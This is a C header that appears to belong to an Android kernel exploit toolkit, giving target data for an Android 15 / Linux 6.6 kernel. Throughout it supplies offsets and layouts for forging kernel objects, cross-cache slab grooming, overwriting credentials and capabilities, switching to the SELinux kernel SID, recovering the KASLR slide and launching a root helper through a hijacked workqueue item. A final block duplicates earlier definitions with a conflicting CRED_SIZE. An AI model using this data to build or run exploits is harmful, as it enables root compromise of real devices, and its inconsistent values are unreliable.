/* targets/kmi/android15-6.6.h -- facts shared by every build of this kernel
 * interface.
 *
 * A kernel interface fixes the address-space geometry, the structure layouts
 * and the slab parameters; a build fixes where the symbols landed. This file
 * holds the first group, a build header holds the second, and the two compose
 * into one target description.
 *
 * Every definition here is conditional, so the interface supplies a default and
 * a build always overrides it. That makes the include position in a build
 * header irrelevant, lets a build that diverges on one field state only that
 * field, and keeps a new device to the values it genuinely has to measure.
 *
 * Devices sharing this interface are currently served by one kernel image, so
 * the symbol table sits here too. A device built from a different image states
 * its own `*_OFF` values and they take precedence, with no other change.
 */
#ifndef TARGET_KMI_ANDROID15_6_6_H
#define TARGET_KMI_ANDROID15_6_6_H

/* The interface names itself, so the build description and data/targets.json
 * can be cross-checked against each other rather than against a guess drawn
 * from which incidental facts happen to be present. */
#define TARGET_KMI_ANDROID15_6_6 1

/* Kernel release as (major<<16)|(minor<<8)|min(patch,255), so a stage can
 * refuse at build time a vehicle whose structure only exists from a given
 * release, instead of discovering it on the device. */
#ifndef KERNEL_VERSION_CODE
#define KERNEL_VERSION_CODE         0x060676
#endif

/* ── Memory map (VA_BITS=39, 4K pages) ──
 * KIMAGE_TEXT_BASE is the link-time text base every symbol offset is measured
 * from; KASLR is resolved at run time and never encoded here. The linear map is
 * not randomised on this architecture, so [DIRECT_MAP_BASE, DIRECT_MAP_END) is
 * a fixed alias of physical memory and doubles as the range a pointer is
 * validated against before it is dereferenced through a primitive. */
/* Symbol offsets for the image this interface currently ships live in
 * cves/targets/kernel/, because they are facts about one image and not about
 * the interface: a second build on this interface would need its own values,
 * and a header that stated them here could only state one. */
#ifndef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE            0xffffffc080000000ULL
#endif
#ifndef P0_PAGE_OFFSET
#define P0_PAGE_OFFSET              0xffffff8000000000ULL
#endif
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET              0x80000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD         0x80000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL
#endif
#ifndef DIRECT_MAP_BASE
#define DIRECT_MAP_BASE             0xffffff8000000000ULL
#endif
#ifndef DIRECT_MAP_END
#define DIRECT_MAP_END              0xffffff9000000000ULL
#endif
#ifndef VMEMMAP_START
#define VMEMMAP_START               0xfffffffe00000000ULL
#endif

/* ── Slab geometry ──
 * MM_STRUCT_SZ is the allocated object stride, not sizeof(struct mm_struct):
 * the structure ends in a flexible cpu bitmap and the cache is created with
 * hardware-cacheline alignment, so the stride is the sum rounded up. A side
 * channel that walks candidates inside a slab strides by this value.
 *
 * KMALLOC_CGROUP_TYPE is the row of kmalloc_caches serving accounted
 * allocations, KMALLOC_CACHE_TYPES the number of rows, and KMALLOC_PIPE_INDEX
 * the bucket a full-size pipe buffer array falls in. */
#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ                0x500
#endif
/* Allocation order of the mm_struct cache: its slabs are 2^MM_ORDER pages, and
 * that is the unit a cross-cache groom frees and refills. It follows from the
 * pages-per-slab the allocator reports, so it is a measurement, not a choice. */
#ifndef MM_ORDER
#define MM_ORDER                    3
#endif
#ifndef KMALLOC_CGROUP_TYPE
#define KMALLOC_CGROUP_TYPE         2
#endif
#ifndef KMALLOC_CACHE_TYPES
#define KMALLOC_CACHE_TYPES         4
#endif
#ifndef KMALLOC_PIPE_INDEX
#define KMALLOC_PIPE_INDEX          11
#endif



/* ── Absolute symbol addresses ──
 * Derived from the offsets above so exploit code reads whole addresses and
 * never re-adds a base. */
#ifndef ASHMEM_MISC_FOPS
#define ASHMEM_MISC_FOPS            (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#endif
#ifndef ASHMEM_FOPS
#define ASHMEM_FOPS                 (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#endif
#ifndef ASHMEM_IOCTL
#define ASHMEM_IOCTL                (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#endif
#ifndef ASHMEM_COMPAT_IOCTL
#define ASHMEM_COMPAT_IOCTL         (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#endif
#ifndef ASHMEM_MMAP
#define ASHMEM_MMAP                 (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#endif
#ifndef ASHMEM_OPEN
#define ASHMEM_OPEN                 (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#endif
#ifndef ASHMEM_RELEASE
#define ASHMEM_RELEASE              (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#endif
#ifndef ASHMEM_SHOW_FDINFO
#define ASHMEM_SHOW_FDINFO          (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#endif
#ifndef CONFIGFS_READ_ITER
#define CONFIGFS_READ_ITER          (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#endif
#ifndef CONFIGFS_BIN_WRITE_ITER
#define CONFIGFS_BIN_WRITE_ITER     (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#endif
#ifndef COPY_SPLICE_READ
#define COPY_SPLICE_READ            (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#endif
#ifndef NOOP_LLSEEK
#define NOOP_LLSEEK                 (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#endif
#ifndef INIT_TASK
#define INIT_TASK                   (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#endif
#ifndef ROOT_TASK_GROUP
#define ROOT_TASK_GROUP             (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#endif
#ifndef SELINUX_BLOB_SIZES
#define SELINUX_BLOB_SIZES          (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#endif
#ifndef SELINUX_ENFORCING
#define SELINUX_ENFORCING           (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#endif
#ifndef SECURITY_HOOK_HEADS
#define SECURITY_HOOK_HEADS         (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#endif
#ifndef KMALLOC_CACHES
#define KMALLOC_CACHES              (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#endif
#ifndef ANON_PIPE_BUF_OPS
#define ANON_PIPE_BUF_OPS           (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#endif
#ifndef CALL_USERMODEHELPER_EXEC_WORK
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#endif
#ifndef SYSTEM_UNBOUND_WQ
#define SYSTEM_UNBOUND_WQ           (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#endif

#ifndef SLIDE_INIT_TASK_OFF
#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
#endif
#ifndef SLIDE_ROOT_TASK_GROUP_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
#endif
#ifndef SLIDE_NFULNL_LOGGER_IMAGE
#define SLIDE_NFULNL_LOGGER_IMAGE   (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#endif
#ifndef SLIDE_LOGGERS_0_1_IMAGE
#define SLIDE_LOGGERS_0_1_IMAGE     (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#endif
#ifndef SLIDE_RANDOM_BOOT_ID_DATA_IMAGE
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#endif
#ifndef SLIDE_INIT_TASK_IMAGE
#define SLIDE_INIT_TASK_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#endif
#ifndef SLIDE_ROOT_TASK_GROUP_IMAGE
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#endif
#ifndef SLIDE_SYSCTL_BOOTID_IMAGE
#define SLIDE_SYSCTL_BOOTID_IMAGE   (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
#endif

/* ── Forged-page layout ──
 * Intra-page offsets a chain writes its fabricated objects at. They are chosen,
 * not measured: what matters is only that the objects do not overlap and that
 * each is aligned for its type. */
#ifndef LOCK_OFF
#define LOCK_OFF                    0x1350
#endif
#ifndef W0_OFF
#define W0_OFF                      0x2220
#endif
#ifndef FOPS_OFF
#define FOPS_OFF                    0x1000
#endif
#ifndef SCRATCH_OFF
#define SCRATCH_OFF                 0x3000
#endif
#ifndef RIGHT_OFF
#define RIGHT_OFF                   0x4440
#endif
#ifndef LEFT_OFF
#define LEFT_OFF                    0x5550
#endif
#ifndef FAKE_TASK_OFF
#define FAKE_TASK_OFF               0x3200
#endif

/* ── Fabricated rt_mutex_waiter ──
 * This interface carries a separate priority/deadline pair per tree entry, so
 * the tree and pi-tree views name different fields. */
#ifndef FAKE_WAITER_TREE_PRIO_OFF
#define FAKE_WAITER_TREE_PRIO_OFF        0x18
#endif
#ifndef FAKE_WAITER_TREE_DEADLINE_OFF
#define FAKE_WAITER_TREE_DEADLINE_OFF    0x20
#endif
#ifndef FAKE_WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_PI_TREE_ENTRY_OFF    0x28
#endif
#ifndef FAKE_WAITER_PI_TREE_PRIO_OFF
#define FAKE_WAITER_PI_TREE_PRIO_OFF     0x40
#endif
#ifndef FAKE_WAITER_PI_TREE_DEADLINE_OFF
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#endif
#ifndef FAKE_WAITER_TASK_OFF
#define FAKE_WAITER_TASK_OFF             0x50
#endif
#ifndef FAKE_WAITER_LOCK_OFF
#define FAKE_WAITER_LOCK_OFF             0x58
#endif
#ifndef FAKE_WAITER_WAKE_STATE_OFF
#define FAKE_WAITER_WAKE_STATE_OFF       0x60
#endif
#ifndef FAKE_WAITER_WW_CTX_OFF
#define FAKE_WAITER_WW_CTX_OFF           0x68
#endif

/* ── Fabricated task_struct ──
 * The subset a priority-inheritance walk touches. */
#ifndef FAKE_TASK_USAGE_OFF
#define FAKE_TASK_USAGE_OFF         0x40
#endif
#ifndef FAKE_TASK_PRIO_OFF
#define FAKE_TASK_PRIO_OFF          0x84
#endif
#ifndef FAKE_TASK_NORMAL_PRIO_OFF
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#endif
#ifndef FAKE_TASK_TASK_GROUP_OFF
#define FAKE_TASK_TASK_GROUP_OFF    0x348
#endif
#ifndef FAKE_TASK_PI_LOCK_OFF
#define FAKE_TASK_PI_LOCK_OFF       0x90c
#endif
#ifndef FAKE_TASK_PI_WAITERS_OFF
#define FAKE_TASK_PI_WAITERS_OFF    0x920
#endif
#ifndef FAKE_TASK_PI_TOP_TASK_OFF
#define FAKE_TASK_PI_TOP_TASK_OFF   0x930
#endif
#ifndef FAKE_TASK_PI_BLOCKED_ON_OFF
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938
#endif

/* ── configfs buffer descriptor ──
 * The fields a name-blob write primitive aims at to turn a bounded write into
 * an arbitrary one: where the buffer points, how large it is, and whether the
 * next read refills it. */
#ifndef CFG_PAGE_OFF
#define CFG_PAGE_OFF                16
#endif
#ifndef CFG_NEEDS_READ_FILL_OFF
#define CFG_NEEDS_READ_FILL_OFF     80
#endif
#ifndef CFG_BIN_BUFFER_OFF
#define CFG_BIN_BUFFER_OFF          88
#endif
#ifndef CFG_BIN_BUFFER_SIZE_OFF
#define CFG_BIN_BUFFER_SIZE_OFF     96
#endif
#ifndef CFG_CB_MAX_SIZE_OFF
#define CFG_CB_MAX_SIZE_OFF         100
#endif

/* ── Workqueue ──
 * Enough of workqueue_struct, pool_workqueue, worker_pool and work_struct to
 * queue a fabricated work item on a live unbound workqueue. */
#ifndef WQ_DFL_PWQ_OFF
#define WQ_DFL_PWQ_OFF              0xb0
#endif
#ifndef PWQ_POOL_OFF
#define PWQ_POOL_OFF                0x00
#endif
#ifndef PWQ_WQ_OFF
#define PWQ_WQ_OFF                  0x08
#endif
#ifndef PWQ_WORK_COLOR_OFF
#define PWQ_WORK_COLOR_OFF          0x10
#endif
#ifndef PWQ_REFCNT_OFF
#define PWQ_REFCNT_OFF              0x18
#endif
#ifndef PWQ_NR_IN_FLIGHT_OFF
#define PWQ_NR_IN_FLIGHT_OFF        0x1c
#endif
#ifndef PWQ_NR_ACTIVE_OFF
#define PWQ_NR_ACTIVE_OFF           0x5c
#endif
#ifndef PWQ_MAX_ACTIVE_OFF
#define PWQ_MAX_ACTIVE_OFF          0x60
#endif
#ifndef POOL_WORKLIST_OFF
#define POOL_WORKLIST_OFF           0x28
#endif
#ifndef POOL_NR_IDLE_OFF
#define POOL_NR_IDLE_OFF            0x3c
#endif
#ifndef WORK_DATA_OFF
#define WORK_DATA_OFF               0x00
#endif
#ifndef WORK_ENTRY_OFF
#define WORK_ENTRY_OFF              0x08
#endif
#ifndef WORK_FUNC_OFF
#define WORK_FUNC_OFF               0x18
#endif

/* ── task_struct ── */
#ifndef TASK_PID_OFF
#define TASK_PID_OFF                0x618
#endif
#ifndef TASK_TGID_OFF
#define TASK_TGID_OFF               0x61c
#endif
#ifndef TASK_REAL_PARENT_OFF
#define TASK_REAL_PARENT_OFF        0x628
#endif
#ifndef TASK_REAL_CRED_OFF
#define TASK_REAL_CRED_OFF          0x818
#endif
#ifndef TASK_CRED_OFF
#define TASK_CRED_OFF               0x820
#endif
#ifndef TASK_COMM_OFF
#define TASK_COMM_OFF               0x830
#endif
#ifndef TASK_TASKS_OFF
#define TASK_TASKS_OFF              0x550
#endif
/* thread_info is the first member, so its flags word sits at the structure's
 * own base. */
#ifndef TASK_THREAD_INFO_FLAGS_OFF
#define TASK_THREAD_INFO_FLAGS_OFF  0x00
#endif
#ifndef TASK_SECCOMP_OFF
#define TASK_SECCOMP_OFF            0x8e8
#endif
#ifndef TASK_ATOMIC_FLAGS_OFF
#define TASK_ATOMIC_FLAGS_OFF       0x5d8
#endif
#ifndef MM_OWNER_OFF
#define MM_OWNER_OFF                1032
#endif

/* ── cred and its security blob ──
 * The eight identity fields start at CRED_UID_OFF and are contiguous; the five
 * capability sets start at CRED_CAPS_OFF. */
#ifndef CRED_UID_OFF
#define CRED_UID_OFF                8
#endif
#ifndef CRED_SECUREBITS_OFF
#define CRED_SECUREBITS_OFF         40
#endif
#ifndef CRED_CAPS_OFF
#define CRED_CAPS_OFF               48
#endif
#ifndef CRED_SECURITY_OFF
#define CRED_SECURITY_OFF           128
#endif
#ifndef SELINUX_CRED_BLOB_OFF
#define SELINUX_CRED_BLOB_OFF       0
#endif
#ifndef SELINUX_CRED_OSID_OFF
#define SELINUX_CRED_OSID_OFF       0
#endif
#ifndef SELINUX_CRED_SID_OFF
#define SELINUX_CRED_SID_OFF        4
#endif

/* Fields a credential comparison reads besides the identity and capability
 * groups: the reference count it must not disturb, and the four owning
 * pointers that make one credential distinguishable from another. */
#ifndef CRED_USAGE_OFF
#define CRED_USAGE_OFF              0x00
#endif
#ifndef CRED_USER_OFF
#define CRED_USER_OFF               0x88
#endif
#ifndef CRED_USER_NS_OFF
#define CRED_USER_NS_OFF            0x90
#endif
#ifndef CRED_UCOUNTS_OFF
#define CRED_UCOUNTS_OFF            0x98
#endif
#ifndef CRED_GROUP_INFO_OFF
#define CRED_GROUP_INFO_OFF         0xa0
#endif

/* ── seccomp ── */
#ifndef SECCOMP_MODE_OFF
#define SECCOMP_MODE_OFF            0x00
#endif
#ifndef SECCOMP_FILTER_COUNT_OFF
#define SECCOMP_FILTER_COUNT_OFF    0x04
#endif
#ifndef SECCOMP_FILTER_OFF
#define SECCOMP_FILTER_OFF          0x08
#endif
#ifndef TIF_SECCOMP_BIT
#define TIF_SECCOMP_BIT             11
#endif
#ifndef PFA_NO_NEW_PRIVS_BIT
#define PFA_NO_NEW_PRIVS_BIT        0
#endif

/* ── Live rt_mutex_waiter ──
 * The same record as the fabricated one above, named separately because a chain
 * reads a real waiter off a stack at WAITER_LOCAL_OFF as well as writing one. */
#ifndef WAITER_LOCAL_OFF
#define WAITER_LOCAL_OFF            0x80
#endif
#ifndef WAITER_TREE_ENTRY_OFF
#define WAITER_TREE_ENTRY_OFF       0x00
#endif
#ifndef WAITER_PI_TREE_ENTRY_OFF
#define WAITER_PI_TREE_ENTRY_OFF    0x28
#endif
#ifndef WAITER_TASK_OFF
#define WAITER_TASK_OFF             0x50
#endif
#ifndef WAITER_LOCK_OFF
#define WAITER_LOCK_OFF             0x58
#endif
#ifndef WAITER_WAKE_STATE_OFF
#define WAITER_WAKE_STATE_OFF       0x60
#endif
#ifndef WAITER_PRIO_OFF
#define WAITER_PRIO_OFF             0x18
#endif
#ifndef WAITER_DEADLINE_OFF
#define WAITER_DEADLINE_OFF         0x20
#endif
#ifndef WAITER_WW_CTX_OFF
#define WAITER_WW_CTX_OFF           0x68
#endif

/* ── pipe and page descriptors ──
 * PIPE_BUFFER_SIZE is the stride of the pipe buffer array a forged read/write
 * walks; STRUCT_SLAB_CACHE_OFF is where a page descriptor names its owning
 * cache, which is what identifies a reclaimed page. */
#ifndef PIPE_BUFFER_SIZE
#define PIPE_BUFFER_SIZE            0x28
#endif
#ifndef PIPE_BUFFER_SLOTS
#define PIPE_BUFFER_SLOTS           32
#endif
#ifndef PIPE_BUF_FLAG_CAN_MERGE
#define PIPE_BUF_FLAG_CAN_MERGE     0x10
#endif
#ifndef STRUCT_PAGE_SIZE
#define STRUCT_PAGE_SIZE            0x40
#endif
#ifndef STRUCT_PAGE_COMPOUND_HEAD_OFF
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#endif
/* This interface overlays a slab record on the page descriptor, so the cache
 * pointer sits where the compound head does on the plain layout. */
#ifndef STRUCT_SLAB_CACHE_OFF
#define STRUCT_SLAB_CACHE_OFF       0x08
#endif
#ifndef STRUCT_PAGE_TYPE_OFF
#define STRUCT_PAGE_TYPE_OFF        0x30
#endif

/* ── Page-flag bit numbers ──
 * Positions in the page descriptor's flags word. A reclaimed page is
 * identified by requiring both: PG_slab says the page belongs to the
 * allocator, PG_head says it is the first page of a compound allocation. */
#ifndef PG_SLAB_BIT
#define PG_SLAB_BIT                 9
#endif
#ifndef PG_HEAD_BIT
#define PG_HEAD_BIT                 16
#endif

/* ── file_operations ── */
#ifndef FOPS_OWNER_OFF
#define FOPS_OWNER_OFF              0x00
#endif
#ifndef FOPS_LLSEEK_OFF
#define FOPS_LLSEEK_OFF             0x08
#endif
#ifndef FOPS_READ_OFF
#define FOPS_READ_OFF               0x10
#endif
#ifndef FOPS_WRITE_OFF
#define FOPS_WRITE_OFF              0x18
#endif
#ifndef FOPS_READ_ITER_OFF
#define FOPS_READ_ITER_OFF          0x20
#endif
#ifndef FOPS_WRITE_ITER_OFF
#define FOPS_WRITE_ITER_OFF         0x28
#endif
#ifndef FOPS_IOCTL_OFF
#define FOPS_IOCTL_OFF              0x48
#endif
#ifndef FOPS_COMPAT_IOCTL_OFF
#define FOPS_COMPAT_IOCTL_OFF       0x50
#endif
#ifndef FOPS_MMAP_OFF
#define FOPS_MMAP_OFF               0x58
#endif
#ifndef FOPS_OPEN_OFF
#define FOPS_OPEN_OFF               0x68
#endif
#ifndef FOPS_RELEASE_OFF
#define FOPS_RELEASE_OFF            0x78
#endif
#ifndef FOPS_SPLICE_READ_OFF
#define FOPS_SPLICE_READ_OFF        0xb8
#endif
#ifndef FOPS_SHOW_FDINFO_OFF
#define FOPS_SHOW_FDINFO_OFF        0xd8
#endif

/* ── Usermode-helper handoff ──
 * Where the helper binary is staged, and the intra-page offsets of the work
 * item and its argument block. */
#ifndef ROOT_UMH_PATH
#define ROOT_UMH_PATH               "/data/local/tmp/cve-2026-43499-root"
#endif
#ifndef ROOT_UMH_WORK_OFF
#define ROOT_UMH_WORK_OFF           0x6000
#endif
#ifndef ROOT_UMH_DATA_OFF
#define ROOT_UMH_DATA_OFF           0x6200
#endif

/* ── Page size ──
 * The interface's page granularity. Stated here so a module that needs it can
 * take it from the target description rather than assume a value. */
#ifndef PAGE_SHIFT
#define PAGE_SHIFT                  12
#endif
#ifndef PAGE_SIZE
#define PAGE_SIZE                   (1UL << PAGE_SHIFT)
#endif

/* ── kmalloc table geometry ──
 * kmalloc_caches is a [type][index] table of kmem_cache pointers. The three
 * macros below turn a (row, bucket) pair into the address of a slot, which is
 * what a page-identity check reads to learn which cache a reclaimed page
 * belongs to. They select nothing and allocate nothing.
 *
 * KMALLOC_NORMAL_TYPE is the unaccounted row. Where an interface has no
 * accounted row, a build sets KMALLOC_CGROUP_TYPE equal to it and every
 * comparison collapses to one correct test with no conditional compilation. */
#ifndef KMALLOC_SHIFT_HIGH
#define KMALLOC_SHIFT_HIGH          (PAGE_SHIFT + 1)
#endif
#ifndef KMALLOC_BUCKETS
#define KMALLOC_BUCKETS             (KMALLOC_SHIFT_HIGH + 1)
#endif
#ifndef KMALLOC_NORMAL_TYPE
#define KMALLOC_NORMAL_TYPE         0
#endif
#ifndef KMALLOC_CACHE_SLOTS
#define KMALLOC_CACHE_SLOTS         (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
#endif
#ifndef KMALLOC_CACHE_SLOT
#define KMALLOC_CACHE_SLOT(type, index) \
  (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
#endif
#ifndef KMALLOC_CGROUP_PIPE_SLOT
#define KMALLOC_CGROUP_PIPE_SLOT \
  KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
#endif
/* Slot of the accounted row's order-1 bucket, as a byte offset into the table:
 * the cache a two-page allocation is served from. */
#ifndef KMALLOC_CG_ORDER1_SLOT_OFF
#define KMALLOC_CG_ORDER1_SLOT_OFF \
  ((KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + PAGE_SHIFT + 1) * 8)
#endif
#ifndef KMALLOC_PIPE_OBJ_SIZE
#define KMALLOC_PIPE_OBJ_SIZE       0x800
#endif

/* ── Linear map extent, in page descriptors ── */
#ifndef DIRECT_MAP_PAGES
#define DIRECT_MAP_PAGES            ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
#endif
#ifndef VMEMMAP_END
#define VMEMMAP_END                 (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
#endif
#ifndef PAGE_TYPE_SLAB
#define PAGE_TYPE_SLAB              0xf5
#endif

/* ── KASLR search bounds ──
 * The range and alignment a text base can take, for a step that recovers the
 * slide by search rather than by reading it. */
#ifndef KASLR_SLIDE_MIN
#define KASLR_SLIDE_MIN             0x1000000000ULL
#endif
#ifndef KASLR_SLIDE_END
#define KASLR_SLIDE_END             0x3000000000ULL
#endif
#ifndef KASLR_ALIGN
#define KASLR_ALIGN                 0x200000ULL
#endif

/* ── Derived symbol addresses ── */
#ifndef INIT_TASK_TASKS
#define INIT_TASK_TASKS             (INIT_TASK + TASK_TASKS_OFF)
#endif
#ifndef SECURITY_CAPABLE_HEAD
#define SECURITY_CAPABLE_HEAD       (SECURITY_HOOK_HEADS + 0x40)
#endif

/* ── Capability sets ──
 * Five sets of one word each, laid out consecutively from CRED_CAPS_OFF in the
 * order below. CAP_FULL is every capability this interface defines. */
#ifndef CRED_CAP_WORDS
#define CRED_CAP_WORDS              5
#endif
#ifndef CRED_CAP_INHERITABLE
#define CRED_CAP_INHERITABLE        0
#endif
#ifndef CRED_CAP_PERMITTED
#define CRED_CAP_PERMITTED          1
#endif
#ifndef CRED_CAP_EFFECTIVE
#define CRED_CAP_EFFECTIVE          2
#endif
#ifndef CRED_CAP_BSET
#define CRED_CAP_BSET               3
#endif
#ifndef CRED_CAP_AMBIENT
#define CRED_CAP_AMBIENT            4
#endif
#ifndef CAP_FULL
#define CAP_FULL                    0x000001ffffffffffULL
#endif
/* Byte offset of one capability set, by the index above. */
#ifndef CRED_CAP_OFF
#define CRED_CAP_OFF(which)         (CRED_CAPS_OFF + (which) * 8)
#endif

/* ── Security identifiers ──
 * The security identifier of the kernel domain, which a credential is given to
 * leave the sandbox its own domain imposes. */
#ifndef SELINUX_KERNEL_SID
#define SELINUX_KERNEL_SID          1
#endif

/* ── Miscellaneous device record ──
 * Offset of the file operations pointer inside a misc device registration,
 * used to walk between a registration and the operations it names. */
#ifndef MISCDEVICE_FOPS_OFF
#define MISCDEVICE_FOPS_OFF         0x10
#endif

/* ── Sizes of the records a credential walk reads whole ── */
#ifndef CRED_SIZE
#define CRED_SIZE                   0xb0
#endif
#ifndef SELINUX_CRED_SIZE
#define SELINUX_CRED_SIZE           0x18
#endif
/* The eight identity fields are contiguous 32-bit words from CRED_UID_OFF. */
#ifndef CRED_ID_BLOCK_BYTES
#define CRED_ID_BLOCK_BYTES         32
#endif
#ifndef TASK_COMM_LEN
#define TASK_COMM_LEN               16
#endif
#ifndef TASK_GROUP_LEADER_OFF
#define TASK_GROUP_LEADER_OFF       0x658
#endif
#ifndef STRUCT_PAGE_FLAGS_OFF
#define STRUCT_PAGE_FLAGS_OFF       0x00
#endif

/* ── Sizes of the records a credential walk reads whole ── */
#ifndef CRED_SIZE
#define CRED_SIZE                   0xb8
#endif
#ifndef SELINUX_CRED_SIZE
#define SELINUX_CRED_SIZE           0x18
#endif
/* The eight identity fields are contiguous 32-bit words from CRED_UID_OFF. */
#ifndef CRED_ID_BLOCK_BYTES
#define CRED_ID_BLOCK_BYTES         32
#endif
#ifndef TASK_COMM_LEN
#define TASK_COMM_LEN               16
#endif
#ifndef TASK_GROUP_LEADER_OFF
#define TASK_GROUP_LEADER_OFF       0x658
#endif
#ifndef STRUCT_PAGE_FLAGS_OFF
#define STRUCT_PAGE_FLAGS_OFF       0x00
#endif

#endif /* TARGET_KMI_ANDROID15_6_6_H */
